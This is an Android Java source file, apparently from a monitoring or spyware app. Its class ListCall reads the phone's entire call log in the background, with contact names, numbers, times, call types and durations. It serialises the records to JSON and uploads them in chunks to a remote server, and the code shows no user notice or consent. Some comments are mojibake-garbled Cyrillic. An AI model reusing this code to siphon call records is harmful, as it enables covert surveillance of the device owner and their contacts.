package com.inet.android.list;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;

import com.inet.android.bs.NetworkChangeReceiver;
import com.inet.android.request.ConstantValue;
import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

/**
 * ListCall class is designed to get the list of call
 * 
 * @author johny homicide
 * 
 */
public class ListCall extends AsyncTask<Context, Void, Void> {
	private Context mContext;
	private String LOG_TAG = ListCall.class.getSimpleName().toString();
	private String complete;
	private int version;
	
	private String readCallLogs() {
		
		String sendStr = null;
		int type = -1;
		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext);
		Logging.doLog(LOG_TAG, "readCall" + version, "readCall" + version);

		if (NetworkChangeReceiver.isOnline(mContext)!= 0) {
			
			Cursor callLogCursor = null;
			// Äåëàåì çàïðîñ ê êîíòåíò-ïðîâàéäåðó
			// è ïîëó÷àåì âñå äàííûå èç òàáëèöû

			complete = "0";
			callLogCursor = mContext.getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI, null, null,
					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

			if (callLogCursor != null) {
				JSONObject archiveCallJson = new JSONObject();

				// Ïðîõîäèì â öèêëå, ïîêà íå äîéä¸ì äî ïîñëåäíåé çàïèñè

				while (callLogCursor.moveToNext()) {

					// Èìÿ êîíòàêòà
					String name = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NAME));

					String cacheNumber = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Íîìåð êîíòàêòà è ò.ä.
					String number = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.NUMBER));
					// String name = getNumber.getContactName(callLogCursor
					// .getString(callLogCursor
					// .getColumnIndex("address")))
					long dateTimeMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DATE));
					// long durationMillis = callLogCursor.getLong(callLogCursor
					// .getColumnIndex(CallLog.Calls.DURATION));
					int callType = callLogCursor.getInt(callLogCursor
							.getColumnIndex(CallLog.Calls.TYPE));
					int durationInt = callLogCursor
							.getColumnIndex(CallLog.Calls.DURATION);
					String duration = callLogCursor.getString(durationInt);

					String dateString = ConvertDate.getDate(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";
					if (callType == CallLog.Calls.OUTGOING_TYPE) {
						type = ConstantValue.TYPE_OUTGOING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
						type = ConstantValue.TYPE_INCOMING_CALL_REQUEST;
					} else if (callType == CallLog.Calls.MISSED_TYPE) {
						type = ConstantValue.TYPE_MISSED_CALL_REQUEST;
					}
					try {
						archiveCallJson.put("time", dateString);
						archiveCallJson.put("number", number);
						archiveCallJson.put("type", type);
						archiveCallJson.put("name", name);
						if (type == 3)
							archiveCallJson.put("duration", duration);
						if (sendStr == null)
							sendStr = archiveCallJson.toString();
						else
							sendStr += "," + archiveCallJson.toString();

					} catch (JSONException e) {
						// TODO Àâòîìàòè÷åñêè ñîçäàííûé áëîê catch
						e.printStackTrace();
					}
					if (sendStr.length() >= 50000) {

						Logging.doLog(LOG_TAG, "str >= 50000", "str >= 50000");
						sendRequest(sendStr, complete);
						sendStr = null;
					}
				}
				if (sendStr != null) {
					lastRaw(sendStr);
					sendStr = null;
				} else {
					lastRaw("");
					sendStr = null;
				}
				Logging.doLog(LOG_TAG, "callLogCursor.close()",
						"callLogCursor.close()");
				callLogCursor.close();
			} else {
				Logging.doLog(LOG_TAG, "callLogCursor == null",
						"callLogCursor == null");
				lastRaw("");
				sendStr = null;
			}
		} else {
			endList();
			sendStr = null;
		}
		return null;
	}

	private void endList() {
		Logging.doLog(LOG_TAG, "endList " , "endList "  + version);	
		TurnSendList.setList(ConstantValue.TYPE_LIST_CALL, version, "0", mContext);
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 .." + version, "Send complete 1 .." + version);
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_CALL_REQUEST, complete, version, mContext);
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Àâòîìàòè÷åñêè ñîçäàííàÿ çàãëóøêà ìåòîäà
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}